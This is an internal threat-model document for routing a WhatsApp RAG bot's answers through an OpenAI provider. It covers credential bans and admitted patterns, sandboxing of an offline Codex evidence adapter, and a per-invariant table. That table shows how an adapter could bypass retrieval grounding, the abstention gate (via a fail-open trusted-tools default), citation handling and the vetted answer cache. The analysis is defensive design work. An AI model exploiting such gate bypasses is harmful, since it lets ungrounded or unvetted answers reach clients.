---
date: 2026-08-18
domain: operations
client_case: zantara-wa-provider
sources:
  - apps/backend-rag/backend/services/integrations/wa_inbox_bot.py (re-read this turn)
  - apps/backend-rag/backend/services/rag/agentic/_abstain_policy.py (re-read this turn)
  - apps/backend-rag/backend/services/rag/agentic/orchestrator_core.py (grepped this turn, _inject_curated_qa_grounding L544/L1504)
  - apps/backend-rag/backend/services/agents/tool_authorizer.py (re-read this turn, SENSITIVE_TOOLS L84)
  - apps/backend-rag/backend/services/rag/agentic/tool_executor.py (re-read this turn, _strip_reserved_args L42)
  - apps/backend-rag/backend/services/rag/agentic/llm_gateway.py (re-read this turn, head)
  - apps/backend-rag/backend/llm/genai_client.py (grepped this turn, GenAIClient.__init__ L388)
  - apps/backend-rag/backend/app/core/config.py (grepped this turn, openai_api_key L35-116, wa_mirror_internal_key L1064, wa_inbox_bot_profile_key L1091)
  - repo-wide grep for OPENAI_API_KEY / AsyncOpenAI usage (this turn — 15+ existing call sites)
  - .agents/skills/bot/SKILL.md (loaded this turn, LIVE STATE + Anatomy + blood-bought rules)
  - research/operations/2026-07-24-zantara-bot-consultant-assistant-spec.md (read this turn, W-1/W0 containment, §3 P0-MEM/P0-ID/P0-ARG/P0-FLOOD)
  - CLAUDE.md (project) §5 Anthropic SDK ban precedent + §9 abstain thresholds SSOT
  - apps/backend-rag/backend/services/rag/agentic/llm_gateway.py (re-grepped this turn, OpenRouter fallback :65/:130/:344-365)
  - apps/backend-rag/backend/core/observability.py (re-read this turn, :213-221, AsyncOpenAI DeepSeek/Ollama base_url)
  - apps/backend-rag/backend/services/rag/agentic/_reasoning_policy.py + _reasoning_evidence.py (re-read this turn, apply_shared_trusted_flippers/detect_trusted_tool_usage)
  - apps/backend-rag/backend/services/rag/agentic/orchestrator_streaming_core.py:378 (re-read this turn, trusted_tools_used fail-open default)
  - developers.openai.com/api/reference/workload-identity-federation (WebFetch, earlier this session)
  - developers.openai.com/api/docs/guides/tools (WebSearch this turn — mcp/web_search/file_search tool types)
  - OpenAI Responses API refusal/incomplete_details schema (WebSearch this turn, community + developer docs)
  - OpenAI sk-proj- Projects launch date (WebSearch this turn — April 2024, corrects an earlier "since 2023" draft claim)
  - PR #4216 source head 0b8705527 (Codex subscription adapter, offline harness, tests, CI, and ADR)
  - research/operations/2026-08-15-bot-provider-failure-matrix.md (R28 reconciliation)
adversarial_review: >-
  Historical draft reviewed by Kimi K3 and Gemini; R28 adapter review Kimi K3
  SHIP plus Gemini 3.7 Flash High degraded fallback SHIP after Gemini 3.1 Pro
  FIX-FIRST; R28 document review Kimi K3 FIX-FIRST findings corrected; mandatory
  final Fable/Claude on-disk gate pending
---

# Zantara WA bot — OpenAI provider threat model

## R28 current frozen-diff reassessment — 2026-08-18

This section is authoritative for the current PR. The long-form body beneath it is preserved as
review archaeology: it threat-modeled an earlier Responses-API-key design and, before that, a
discarded pseudo-shadow branch. Whenever an earlier sentence conflicts with this section, this
section wins.

**Frozen target:** PR #4216 source head `0b8705527`, reconciled with `origin/main` at
`993e4e868a6e8210328f69ccd136ca9d5c54d776`. The current fence is eleven files: the standalone
subscription adapter and test, the dormant Responses adapter and test, role-aware corpus/benchmark
tooling and tests, the ADR, test-package marker, and the existing CI workflow. `config.py`,
`llm_gateway.py`, WhatsApp routers/workers, live settings, secrets, and the bot skill's LIVE STATE
are unchanged. There is no live importer, flag, shadow dispatch, client traffic, deploy, or cutover.

**Selected evidence provider:** `CodexExecClient`, using the operator's existing ChatGPT Pro
subscription through headless `codex exec`. The `OpenAIResponsesClient` remains dormant and receives
no paid API key. Zero's later ruling records ChatGPT Pro as the intended credential path if a future
WA runtime is separately designed and authorized; the current authorization stops at this human-run
offline evidence lane. It does not authorize a personal subscription credential as a Fly service
credential, runtime wiring, traffic, deployment, or cutover. Historical F1/F3 below therefore remain
valid runtime bans, but no longer describe the selected offline adapter as prohibited code.

### Current threat disposition

| Surface | Current control/evidence | Residual gate |
| --- | --- | --- |
| Credential and cost | No `OPENAI_WA_PROVIDER_API_KEY` or paid API call. Availability checks the configured local `CODEX_HOME` auth file. Fresh isolated homes reported `Not logged in` and failed controlled exec attempts with HTTP 401; the earlier Keychain inference is superseded | Credential presence is not credential liveness. Production host/identity and subscription-automation suitability remain operator architecture decisions |
| PII and real-data egress | No real WA export or client row was processed. The corpus builder requires structured role-aware JSONL, keeps conversation identifiers in memory only, emits only user targets, caps history at 12, independently redacts/scans each turn, and clears accumulated history after unsafe/unattributable input | Independent human privacy/legal review is mandatory before any export is processed or any fixture reaches the provider. Raw WA/OSINT remains on Pro and must never be copied to Air-M5 |
| Process isolation | Fixed argv uses neutral temporary cwd, read-only sandbox, `--ephemeral`, `--ignore-user-config`, `--ignore-rules`, stdin-only prompt, reduced env allowlist, and an allowlisted model | A coding agent in a read-only sandbox is not a no-tools/no-host-read process. Stronger isolation must be independently approved before any real client text |
| Lifecycle and exception boundary | Launch, timeout, auth, output-shape, process, tempdir, and generic communication failures map to sanitized typed errors. Timeout, arbitrary communication failure, single cancellation, and repeated cancellation kill and fully reap the child before returning/propagating | Real subscription quota/usage-window wording remains unmeasured and has no dedicated class; ambiguous seat-wide failures must stop the lane |
| Persistence | The final adapter probe returned a synthetic sentinel exactly, held the observed session-file count at `3273 -> 3273`, and found no sentinel beneath the searched `~/.codex` tree | This is narrow evidence for one call and searched surfaces, not universal non-persistence proof |
| Context and tool parity | Offline fixtures now carry canonical roles plus up to 12 prior turns. The benchmark defaults to a narrow `CodexSubscriptionBenchClient` facade and invokes candidates sequentially | The adapter is text-in/text-out: no native tool calls, RAG state, citations, or production ReAct parity. A blind conversational-safety score cannot prove end-to-end replacement quality |
| Runtime reachability | None. Fly does not inherit this Air-M5 user's CLI binary or ChatGPT OAuth state | A separate architecture, default-off wiring PR, threat review, and serve-stage gate would be required; PR #4216 cannot be promoted by configuration |
| Dormant Responses client | Still stateless with `store:false`, no live consumer, and no key | Historical API-retention analysis remains relevant only if that separate path is ever revived with explicit paid-key authorization |

### Verification and verdict

One addopts-free local process collected and passed **482 tests**: 71 subscription-adapter, 163
dormant Responses-adapter, and 248 corpus/benchmark tests. The backend PR CI job already collects
`backend/tests/`, including both adapter suites, and now explicitly adds
`scripts/bot/test_build_deid_corpus.py` and `scripts/bot/test_wa_blind_bench.py`. Targeted Ruff `F,I`,
workflow YAML parsing, Prettier, and `git diff --check` passed.

Kimi K3 returned SHIP. Gemini 3.1 Pro returned FIX-FIRST; the two code findings were accepted and
closed: a second cancellation can no longer interrupt reaping, and the offline harness tests are
now in CI discovery. The focused Gemini 3.1 Pro re-review timed out and produced no verdict. The
declared continuity fallback, Gemini 3.7 Flash High, returned SHIP with
`degraded_execution: true`. The repository's mandatory final Fable/Claude on-disk gate remains
pending.

A separate Kimi K3 review of this R28 documentation returned FIX-FIRST on two authorization-wording
ambiguities. The adapter docstring now distinguishes the intended future credential path from the
current offline-only authorization, and this document no longer labels a merge-blocked artifact
"SHIP." Bundle-limited observations in that review were marked UNVERIFIED rather than defects; the
eleven-file fence and test paths were independently checked against the source worktree.

**Threat disposition:** acceptable for independent review only as **unwired offline evidence
tooling**. This is not a merge or activation authorization. Real WhatsApp data, shadow traffic,
serving, merge, deploy, and cutover remain BLOCKED pending their named gates. The threat model must
be run again against the actual future runtime design because that design does not exist in this PR.

## ⚠️ Historical snapshot header — SUPERSEDED by R28 above

**Base**: `origin/main` @ `7e66a8b3d003de0327e1ff7669e038b467ee8a94` (verifier and implementer
worktrees share this merge-base — confirmed via `git merge-base HEAD origin/main` in both, this
turn). **The implementer worktree (`.worktrees/bot-openai-adapter`) has ZERO commits on its branch
— every change is uncommitted working-tree state**, verified via `git status --short` this turn:

```
 M apps/backend-rag/backend/app/core/config.py
 M apps/backend-rag/backend/services/rag/agentic/llm_gateway.py
?? apps/backend-rag/backend/llm/openai_responses_client.py
?? apps/backend-rag/backend/services/rag/agentic/_shadow_provider.py
?? apps/backend-rag/backend/tests/llm/
?? apps/backend-rag/backend/tests/rag/
?? scripts/bot/
```

`git diff --stat` against the merge-base for the two tracked files: `config.py` +41,
`llm_gateway.py` +18 (59 lines total tracked; the `??` entries are untracked and not counted by
`diff --stat`). **This is a moving target by construction** — findings below dated to an earlier
pass of this review have already gone stale once (see the store:false correction in §Live diff
review). **This document is a review of an UNFROZEN diff and MUST be re-executed (Kimi K3 +
Google/agy Gemini seat, fresh prompts, not recycled verdicts) once the implementer commits and opens
a PR.** Nothing below should be read as a final verdict on that eventual PR's actual diff.

**⚠️ SUPERSEDED — re-verified this turn during the Kimi K3 adversarial pass (both this document and
Deliverable 2's real, from-scratch review, per team-lead's ratified protocol).** Everything above
this paragraph describes a state that no longer exists. The implementer worktree now has **two
commits** on its branch (`b36fc9521`, `8a7aa9be5` — "ZERO commits" above is false as of this check),
and the second commit's message states this explicitly: *"Rework of the vetoed shadow-provider
design: standalone `OpenAIResponsesClient`... zero wiring into any live path. Reads only
`OPENAI_WA_PROVIDER_API_KEY` (never the embeddings `OPENAI_API_KEY`)."* Re-verified independently
this turn by BOTH the Kimi K3 refuter (live `git`/`grep` in that worktree) and a separate
verification fork this session dispatched for the same purpose (fence-compliance check below):

- `_shadow_provider.py` is **deleted**. `git diff <merge-base> -- config.py llm_gateway.py` in that
  worktree is now **empty** — the shadow-dispatch changes to `config.py`/`llm_gateway.py` this
  header's `git status --short` block shows (`+41`/`+18`) are gone; no `OPENAI_SHADOW`,
  `maybe_dispatch`, or `_run_shadow` reference remains anywhere in `llm_gateway.py`/`config.py`.
- **Findings 5, 6, and 7** in §Live diff review below (all marked CONFIRMED, Finding 7 called "the
  most important cross-cutting finding for Deliverable 2") analyze this now-deleted design. They are
  correctly-verified-at-the-time findings about code the implementer has since reworked away — see
  the per-row STALE annotations added below rather than deleting them (W113: a correction is a new
  claim, verify it, don't silently overwrite).
- **Finding 0**'s core claim ("the ADR file does not exist anywhere") is also overtaken: the ADR now
  exists on disk in that worktree (`research/operations/2026-08-15-adr-wa-runtime-openai-provider.md`,
  19.7 KB, still `??` untracked — so G15's "on disk at merge time" criterion is not yet satisfied,
  but "does not exist anywhere" is no longer accurate). Its own header documents the rework: *"author:
  Sonnet 5 implementer session... rework after a first builder session shipped a VETOED design (an
  unwired 'shadow' branch presented as live state...)"*.
- The header's `llm_gateway.py` **+18** vs §Live diff review's **+25** for the same file (both
  claimed "verified this turn," never reconciled) is a genuine internal inconsistency, caught by the
  Kimi K3 pass — flagged and left as-is below for the record, now moot since both numbers describe a
  diff that no longer exists.

This is a strong point in the standalone client's favor — the rework already independently landed
several of this document's own recommendations (dedicated credential, no shadow dead-code) before
this review even reached them — but it means §Live diff review's Findings 0/5/6/7 must be read as
**historical**, not current, and the freeze re-review (§Freeze re-review below) is not optional
scaffolding, it is the only way to get a verdict on what's actually there now.

## Reader's contract

This was a **verifier lane**, independent from the implementer lane building the OpenAI-provider
PR. Nothing here arms, merges, or deploys anything. The historical mandate below was bounded to
introducing **OpenAI API (project service account, API key or WIF, Responses API)** behind (or
alongside) the Zantara WA bot's RAG orchestrator. Its then-ratified council verdict was **NO-GO** on
ChatGPT/Codex OAuth-subscription tokens as a WA runtime credential and **CONDITIONAL-GO** on an
OpenAI API project service account. Zero later selected ChatGPT Pro for a strictly local, human-run
offline evidence adapter. R28 above reconciles those decisions: the runtime ban stands, while the
offline adapter is admitted but remains unwired. The remainder of this document preserves the
earlier API-path analysis and must not be used to override R28's current disposition.

**CORRECTED post-Kimi-refutation, verified this turn**: an earlier draft of this paragraph said
the orchestrator "today runs exclusively on Gemini." That is false-by-flag, not by architecture.
`llm_gateway.py` already contains a complete second-provider egress path — on Gemini failure it
calls `_call_openrouter` (`OpenRouterClient`, `backend/services/llm_clients/openrouter_client.py`,
imported at `llm_gateway.py:65`), gated only by `settings.openrouter_enabled` (`config.py:130`,
default `False`). OpenRouter is a multi-vendor router that can itself serve OpenAI models. See §b
"Routing / provider-selection" (new row) and §Refutation log objection 2.

**THREE provider roles, not two — corrected per team-lead's first-hand verification, confirmed by
this lane this turn.** This document must not collapse to a Gemini-vs-OpenAI binary:

1. **Gemini — live default.** `genai_client.py::GenAIClient`, `settings.google_api_key`. Answers
   every WA query today unless it fails.
2. **OpenRouter — fallback ALREADY PRESENT in `origin/main`'s committed tree, not a hypothetical.**
   Confirmed this turn via `find`: `apps/backend-rag/backend/llm/provider_registry.py` +
   `apps/backend-rag/backend/llm/providers/openrouter.py` (an `LLMProvider`-interface wrapper) exist
   alongside the `llm_gateway.py`-embedded direct path already documented above. Both ultimately
   call the same underlying `backend/services/llm_clients/openrouter_client.py::OpenRouterClient`.
   **A third-party key (OpenRouter's) already exits the Gemini perimeter today**, gated by
   `openrouter_enabled` (default off) for the `llm_gateway.py` path — this lane could NOT confirm a
   production caller of `provider_registry.get_provider("openrouter")` in this pass (`grep` for
   `get_provider(` outside tests found only its own definition and the `backend/llm/__init__.py`
   re-export); whether that second abstraction layer is live, dead scaffolding, or reserved for a
   different consumer is unresolved and flagged for V2/V3, not asserted either way here.
3. **OpenAI Responses — the candidate under evaluation**, the subject of the rest of this document.

The credential/invariant matrix below (§a, §b) is scoped to OpenAI, but OpenRouter's existing
third-party-key surface is real, already live (config-gated), and belongs in the SAME governance
conversation — see new row F8/A5 in §a and the "Provider-selection / fallback semantics" row in §b,
both updated to name OpenRouter explicitly rather than treat "a fallback provider" as OpenAI-only
future risk.

**Non-obvious fact this whole document leans on**: the repo already has an `OPENAI_API_KEY` /
`AsyncOpenAI` footprint — `backend/core/embeddings.py:248/271` (the FROZEN `text-embedding-3-small`
embedder, CLAUDE.md §9), `backend/app/services/audio_service.py:16/46` (voice), 10+ one-off scripts
under `backend/scripts/`. **This is not a green field.** Any threat model that assumes "OpenAI has
never touched this codebase" is wrong on its first sentence, and the gate spec in §Gate V2 has to
name the difference between the EXISTING embeddings/voice usage (batch, non-conversational, no tool
calling, no client PII in the prompt beyond what's already embedded) and the NEW conversational
provider usage (real-time, client free-text, tool-calling, the full RAG context window) explicitly —
a regex that flags "any `AsyncOpenAI` import" would break the embedder on day one (over-match,
scar-family #3) — see §Gate V2, pattern G7.

## §Historical fence compliance — original API-key implementation checklist

The council (5-family panel) established these fences for the original API-key implementation lane,
distinct from this document's own review-only scope. They are preserved because they explain the
discarded design and dormant Responses client. R28 above is authoritative for the later
subscription-backed offline lane; the runtime/privacy fences below remain useful, but the
API-key-only credential selection is no longer the current offline choice.

- Lane implementation = **SOLO client standalone + test HTTP-boundary + corpus/bench locali + ADR
  NO-WIRING**. FORBIDDEN: modifications to `config.py`, `llm_gateway.py`, any shadow dead-code,
  `.agents/skills/bot/SKILL.md` LIVE STATE section, secrets, deploy, real traffic.
- Credential: **ONLY `OPENAI_WA_PROVIDER_API_KEY`** (project service account or WIF, billing/identity
  separate from the embeddings key) — see G20 above. `OPENAI_API_KEY` (generic/shared) is a banned
  pattern for this adapter, same tier as the credential bans in §a.
- `store:false` without a false zero-retention promise (G11 above; Deliverable 2 §2/§3.4).
- No push/PR of implementation work before: freeze + a net-diff check confirming the fences above +
  a final Kimi K3 + Google/agy Gemini review of the FROZEN diff. #4194 (this verifier PR) stays
  DRAFT/HOLD throughout and updates only against the frozen diff.

**Compliance check, run this turn** (verification fork, `git status --short` + `git diff --stat`
+ `git log origin/main..HEAD` in `.worktrees/bot-openai-adapter`, cross-confirmed independently by
the Kimi K3 adversarial pass's own live `git` checks in the same worktree):

- `config.py` / `llm_gateway.py`: **NOT touched** — `git diff <merge-base> -- config.py
  llm_gateway.py` is empty. Consistent with the rework note in the Snapshot header above (the
  shadow-dispatch changes to these two files were reworked away, not merely reverted-then-reapplied).
- **No shadow dead-code exists** — `_shadow_provider.py` deleted, zero `OPENAI_SHADOW`/
  `maybe_dispatch` references anywhere in the tree.
- Committed diff (`git log origin/main..HEAD`, 2 commits: `b36fc9521`, `8a7aa9be5`) touches only
  `apps/backend-rag/backend/llm/openai_responses_client.py` (new, standalone client),
  `apps/backend-rag/backend/tests/llm/test_openai_responses_client.py` (its own test — HTTP-boundary
  shaped, per the client's fail-closed-on-response-shape design already documented above), plus a
  second commit adding a de-identified-corpus builder and blind-bench harness under `scripts/bot/`
  (local corpus/bench — matches the allowed category, not independently reviewed here, out of scope
  for V1). An untracked ADR file exists (Finding 0 above) — matches the ADR-NO-WIRING category, still
  uncommitted.
- Credential: the rework commit's own message states *"Reads only `OPENAI_WA_PROVIDER_API_KEY`
  (never the embeddings `OPENAI_API_KEY`)"* — matches G20.

**As of THIS check, the fence is holding.** This directly CONTRADICTS an earlier claim (team-lead,
properly-tagged message, citing a check "in questo turno precedente") that the WIP already violated
the fences via modifications to `config.py`/`llm_gateway.py`/`_shadow_provider.py`. The most likely
explanation, not confirmed: that earlier check ran against a snapshot taken before the rework commits
(`b36fc9521`/`8a7aa9be5`, timestamped ~01:15 on 2026-08-15) landed — i.e. the violation was real at
the time it was reported and has since been fixed by the same rework this section's checks observe,
rather than the two checks disagreeing about the same state. Flagged for team-lead's awareness rather
than silently resolved either way (W106/W106b discipline — a stale measurement presented as current
is exactly the failure class this repo has scar tissue for). This compliance check must be re-run at
freeze regardless of which explanation is correct.

---

## (a) Credential surfaces

### FORBIDDEN patterns — must be bannable in CI, not just written down

| # | Pattern | Why it is the P0 the council already ruled NO-GO on |
|---|---|---|
| F1 | An OAuth **consumer-subscription** token used as a service credential — anything shaped like `CHATGPT_SESSION_TOKEN`, `~/.codex/auth.json` read at runtime, `CODEX_HOME` env pointed at a prod secret store, `~/.chatgpt/` cookie jar, or a `codex exec` / `codex login` invocation from a Fly machine. This is the ban the council already voted NO-GO on: personal-subscription auth is not a service credential — it has no project scoping, no per-key kill switch, no usage attribution separate from Zero's personal account, and (per CLAUDE.md §5) is explicitly the SAME class of thing already banned for Anthropic (`ANTHROPIC_API_KEY`/`claude` CLI as a service dependency) generalized to OpenAI. |
| F2 | A **session cookie / browser-auth artifact** for chat.openai.com or platform.openai.com committed, logged, or read from disk at request time (mirrors the FlowKit/Kimi-desktop pattern used ELSEWHERE in this repo for AI Ultra/Allegro flat-subs — that pattern is fine for those subs, it is exactly wrong for a paid API surface that needs per-key revocation and billing isolation). |
| F3 | `apps/backend-rag/backend/llm/claude_oauth_client.py`'s pattern **inverted for OpenAI** — i.e. shelling out to a CLI (`codex exec`) with an OAuth token from `~/.nuzantara-secrets.env` as the runtime path for a client-facing HTTP request. That pattern exists for Claude specifically because Claude's ONLY sanctioned path is MAX-plan OAuth (CLAUDE.md §5); OpenAI's sanctioned path for THIS use case is the opposite — a metered API key, never a subprocess wrapping a personal subscription. Do not let "we already have a subprocess-CLI pattern in this repo" become the template. |
| F4 | The key **hardcoded, logged, or interpolated into an f-string that reaches `logger.info`/`print`/Sentry breadcrumb**. `backend/core/observability.py` auto-traces `openai.AsyncOpenAI` instances (`:74`, `:217` — "traces every `openai.AsyncOpenAI` instance") — an adapter that doesn't route through the existing Langfuse instrumentation registration is either invisible to tracing (bad) or auto-traced with **no PII redaction pass equivalent to `sentry_config.py::_before_send`** applied to the request/response body (worse — a client's free-text WA message, verbatim, into a third-party observability pipeline). |
| F5 | `CLAUDE_CODE_OAUTH_TOKEN`, `ANTHROPIC_API_KEY`, or any Anthropic credential appearing ANYWHERE in the new adapter's code, config, or test fixtures — this file's existence must never become the wedge that reintroduces the banned Anthropic paid path "by analogy, since we just built an OpenAI one." Orthogonal ban, restated because a generic "LLM provider adapter" PR is exactly the shape that invites "let's make it pluggable to Claude too" scope creep. |
| F6 | The new key stored with **secrets-permissions family #4 violations** (cicatrix `.claude/rules/cicatrix-superscar.md` §4) — world-readable `.env`, a `.bak` copy without `chmod 0600`, or `cat`'d during diagnosis into a session transcript that then gets committed as a research artifact. |
| F7 | A **shared/reused key across environments** — the SAME `OPENAI_API_KEY` used for the existing embeddings/voice batch jobs AND the new conversational WA adapter. This collapses two very different risk profiles (a background batch job with no client-facing surface vs. a real-time endpoint fed by client free-text and exposed to prompt injection) onto one blast radius and one bill; a leak or abuse-flag on one poisons the other. Council's CONDITIONAL-GO explicitly named "least-privilege **project service account**" — that means a **separate OpenAI Project** (Project-scoped API keys, `sk-proj-` prefix, the default key type since **April 2024** — corrected post-refutation, verified by WebSearch this turn; an earlier draft said "since 2023," which is wrong) with its own key, its own usage cap, and its own audit log, not a shared org-level key. |
| F8 | **NEW ROW (three-provider correction)**: treating OpenRouter's already-live third-party key as out of scope because "this document is about OpenAI." OpenRouter (`OPENROUTER_API_KEY`, consumed by `services/llm_clients/openrouter_client.py`, wired into `llm_gateway.py`'s fallback and into `provider_registry.py`'s `OpenRouterProvider`) is a THIRD provider whose credential hygiene the same F1-F7 discipline applies to, and which is `openrouter_enabled`-gated but already committed on `origin/main` — not a future risk this PR introduces. A threat model of "adding a provider" that ignores the provider ALREADY added is incomplete by construction. |

### ADMITTED patterns — the shape the council's CONDITIONAL-GO actually describes

| # | Pattern | Precedent in this repo |
|---|---|---|
| A1 | `OPENAI_API_KEY` (or a WA-adapter-specific alias, see G-naming below) sourced from Fly secrets (`fly secrets set … -a nuzantara-rag`) and read via `pydantic-settings` `Field(...)` the same way `settings.openai_api_key` already works for embeddings (`config.py:35-116`) — i.e. the wiring PATTERN is already sanctioned in this repo for OpenAI specifically (unlike Anthropic, which has zero sanctioned `ANTHROPIC_API_KEY` uses). |
| A2 | **Workload Identity Federation (WIF) — CONFIRMED supported, not hypothetical** (verified this session against OpenAI's own docs, `developers.openai.com/api/reference/workload-identity-federation`, after an earlier draft of this document and a Kimi refutation both under-verified this): a Project configures a trusted Workload Identity Provider (issuer/audience) plus a service-account mapping, and exchanges an externally-issued JWT/OIDC (`urn:ietf:params:oauth:token-type:jwt`/`id_token`) or an X.509 client cert (beta) at OpenAI's token endpoint for a short-lived access token — no long-lived static key on disk at all. One documented gap: WIF-minted tokens **cannot call Admin API endpoints** (those still need a static admin key — irrelevant to this adapter, which only needs the Responses endpoint). Strictly better than a static key for the "leaked and lives forever" failure mode this repo has hit before with Anthropic-adjacent and Telegram bot tokens (CLAUDE.md §13, the `@Balizerobot` burned-token history — read that paragraph before anyone argues a static key is "fine, we'll rotate if needed": rotation requires the leak to be NOTICED first, and this repo's own history says that is not guaranteed). Fly's own workload identity / OIDC broker capability would need to be the "trusted provider" side of this — not evaluated here, handed to the BUILD lane as the preferred path over A1 rather than a fallback. |
| A3 | A **dedicated secret name that is NOT `wa_mirror_internal_key` or `wa_inbox_bot_profile_key`** (the two existing WA-adapter secrets in `config.py:1064/1091`) — mirroring the documented reason those two are already split ("DISTINCT … by design … not full CRUD" / "not a request-controllable value"). Naming suggestion for the gate spec, not a design decision this lane owns: `openai_wa_provider_api_key` (Fly secret `OPENAI_WA_PROVIDER_API_KEY`), scoped to exactly the one adapter module, never imported by `embeddings.py` or `audio_service.py`. |
| A4 | Responses API (not Assistants API, not the legacy Chat Completions tool-calling shape) — the mandate names it explicitly; noted here only to flag that `llm_gateway.py`'s current abstraction (`ChatSession`/`MockChatSession`, tier constants `TIER_FLASH`/`TIER_LITE`/`TIER_PRO`/`TIER_FALLBACK`) is a **Gemini-shaped interface**. A Responses-API adapter is not a drop-in swap of one HTTP client for another — it is a new implementation of whatever contract `LLMGateway` exposes to `reasoning.py`/`orchestrator_core.py`, and every one of those call sites needs to keep working unchanged. That is a BUILD-lane concern, but it is also a threat surface: an adapter that reshapes the contract to fit OpenAI's API more comfortably, rather than fitting OpenAI's API to the EXISTING contract, is exactly how a gate silently stops firing (see §b, "gates read fields the new path never populates"). |
| A5 | **NEW ROW**: `OpenRouterProvider._init_client()` (`providers/openrouter.py`) already does what A1/A2/A3 ask of the OpenAI adapter — lazy client construction, `self._available = bool(self._client.api_key)`, tier-mapped model selection. It is a legitimate PRECEDENT for "how this repo wires a third-party LLM key" — worth reusing its shape (or explaining why the OpenAI adapter deliberately diverges) rather than inventing a fourth pattern in this codebase for the same problem. |

---

## (b) Bypass of bot invariants — per-invariant walkthrough

Each row: the invariant, the concrete mechanism a careless-but-not-malicious OpenAI adapter could
break it by, and the contract test that would catch it (feeds directly into §Gate V2).

| Invariant | Where it lives today (Gemini path) | How an OpenAI adapter breaks it | Contract test |
|---|---|---|---|
| **Retrieval-before-answer** (no ungrounded generation) | `orchestrator_core.py::_inject_curated_qa_grounding` (L544, called L1504) injects curated grounding BEFORE the ReAct loop; the loop itself does tool calls for KB/KBLI/KG retrieval | An OpenAI Responses-API call configured with its own built-in web-search/file-search tool, bypassing the repo's retrieval pipeline entirely — "faster" because OpenAI's own retrieval never touches Qdrant/curated_qa, but then nothing in this repo's grounding contract (provenance, `source_ref`, class TTL) applies to what it retrieved | A test that asserts the OpenAI adapter's tool schema **contains zero OpenAI-native retrieval/browsing tools** (`web_search`, `file_search`, `code_interpreter`-with-web) — only the SAME tool set (`crm_query`, `get_pricing`, KB search, etc.) the Gemini path exposes, enumerated and diffed against the existing `_gemini_tools` list |
| **Abstention — 5 named gates (SSOT `_abstain_policy.py`)** | `AbstainPolicy` computes `generation_threshold`/`label_threshold`/`confidence_low`/`confidence_high` from `evidence_score`. **CORRECTED post-refutation, verified this turn**: `trusted_tools_used` is NOT set by parsing an LLM's response shape — `apply_shared_trusted_flippers` (`_reasoning_policy.py:55-88`) is a pass-through/preserver; the actual signal comes from `detect_trusted_tool_usage` (`_reasoning_evidence.py:107`), which iterates the **executed-steps trace** (tool name + observation length/error markers) — provider-agnostic by construction, as long the adapter drives the same ReAct loop (already required by G3/G4) | The real, verified fail-open is NOT response-shape parsing — it is `orchestrator_streaming_core.py:378`: `trusted = getattr(state, "trusted_tools_used", True)`. A new adapter code path that constructs `state` without ever setting that attribute (e.g. a shortcut that skips whatever step populates it on the Gemini path today) silently defaults to **trusted=True**, landing the streaming confidence zone in "confident" regardless of actual evidence. This is reachable by omission, not by response-shape mismatch | A test that constructs `state` WITHOUT `trusted_tools_used` set and asserts the streaming confidence-zone computation treats it as **untrusted (False)**, not the current fail-open `True` default — this is a code fix (default should flip), not just a test; see §Gate V2 G18 |
| **Provenance / citations** | `orchestrator_response.py:48` types `sources: list[Any]`; `pipeline.py::_normalize_citations` guards `if not isinstance(src, dict): continue`; corner already documents "str runs" losing citations silently (§1, "🔀 sources comes back as dicts on some runs and plain strings on others") | An OpenAI adapter emitting citations as inline Markdown links (`[text](url)`) or as a different JSON shape (OpenAI's own annotation format for file-search results) never populates the `sources` list the same way — citations reach `_normalize_citations`, fail the `isinstance(src, dict)` check, and are silently dropped exactly like the existing str-shaped Gemini runs, compounding a KNOWN, not-yet-closed bug rather than fixing it | A test that asserts every citation the OpenAI adapter emits normalizes to the SAME `{source_ref, source_date, ...}` dict shape `NotebookLMCacheService.set()` already enforces for cache writes — reuse that existing `ValueError`-on-missing-keys contract rather than inventing a second one |
| **PricingTool-only pricing** | `prompt_builder.py:47-66` rules ("ONLY use prices from `get_pricing` tool… NEVER invent, estimate, or guess ANY price"); one all-inclusive client-facing price (Zero ruling 2026-07-17) | A model swap changes NOTHING about this invariant in principle (it is a tool-registration + prompt-instruction contract, provider-agnostic) — the risk is an OpenAI model's different function-calling reliability characteristics (different models call tools at different rates for the same prompt) meaning it invents a price MORE often than Gemini did on the same prompt, silently, because nobody re-measured tool-call rate after the swap | A regression battery (existing pattern: the corner's own probe scripts) re-run against the OpenAI path specifically for pricing questions, asserting `sources` includes a `get_pricing` tool call whenever a price figure appears in the answer text (currency+digit regex, already exists per corner "pricing-content detector is a currency+digit regex, scar-#3-safe") |
| **PII boundary (UU PDP / SYMBIOSIS Law 2)** | Governs cloud LLM processing of client free-text (CLAUDE.md §14) — today's gap is already declared: "the chat gateway does not today prove clause, Art. 56 basis, revocation or per-client consent" and the doctrine is fail-closed until it is | **CORRECTED post-refutation, verified this turn — the "second processor" framing below was wrong and is struck.** `orchestrator_core.py:498` already calls `self.retriever.embedder.generate_query_embedding(query)` on the **raw client WA query text**, and `embeddings.py:240-271` inits `AsyncOpenAI` for the default provider (`config.py:35`, `embedding_provider = "openai"`). **OpenAI is already processor #2 today, on the Gemini-only path, before this PR.** The real delta an OpenAI conversational adapter adds is *scope* — full 12-turn history + tool results + generated answers, vs. today's query-string-only embedding call — and a different retention/endpoint surface (Responses API `store` default, §Live diff review Finding 2 / Deliverable 2 §2), not a new vendor relationship. A PII analysis built on "we're adding OpenAI as a new processor" understates the existing exposure and would write the wrong Art. 56/consent scope | Not a code test — a **design precondition**, corrected: the PII plan (Deliverable 2) must state that OpenAI is ALREADY in the processor chain via embeddings (query text only, batch, non-conversational) and that this PR's actual change is scope-of-data-sent + statefulness, not vendor count. Zero Legge-5 call either way — not session-armable |
| **Answer cache bypasses the abstain gate on a hit (cache safety contract)** | `NotebookLMCacheService.set()` enforces `{source_ref, source_date, domain, confidence_class, source_priority}` via `ValueError` — "cache hits bypass the abstain gate → ONLY pre-vetted content may enter the cache" (established truth #4) | An OpenAI-generated answer written to the SAME cache namespace without going through the provenance-enforcing `.set()` path (e.g. a developer adds a "fast path: write OpenAI's answer straight to Redis for repeat questions" optimization) creates an un-vetted, abstain-gate-bypassing cache entry — the exact shape the existing contract was built to prevent, just from a new writer | A test asserting `grep -r` finds **zero** Redis/cache-write call sites for the new adapter's module outside `NotebookLMCacheService.set()` — i.e. the adapter has no cache-writing code path of its own at all |
